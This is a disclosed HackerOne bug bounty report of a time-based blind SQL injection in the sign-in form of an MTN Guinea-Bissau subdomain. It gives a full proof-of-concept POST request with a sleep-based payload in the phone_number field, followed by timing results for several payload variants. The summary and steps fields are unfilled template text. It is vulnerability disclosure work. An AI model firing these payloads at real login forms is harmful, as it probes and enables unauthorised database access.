# SQL injection [futexpert.mtngbissau.com]

## Report Details
- **Report ID**: 924855
- **URL**: https://hackerone.com/reports/924855
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-07-15T21:42:56.696Z
- **Disclosed**: 2021-09-09T11:40:30.512Z

## Reporter
- **Username**: pisarenko
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
## Summary:
[add summary of the vulnerability]

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Poc Request

`POST /signin/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: https://futexpert.mtngbissau.com/
Cookie: PHPSESSID=sn56alvthfp0l0vvoku34jd2i4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Content-Length: 82
Host: futexpert.mtngbissau.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive`

`phone_number=0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z&pin=1&submit=Continuar`

Tests performed:
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.438
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.394
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.391
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.396
0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.802
0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.436
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.435

## Impact

sql

## Attachments
No attachments
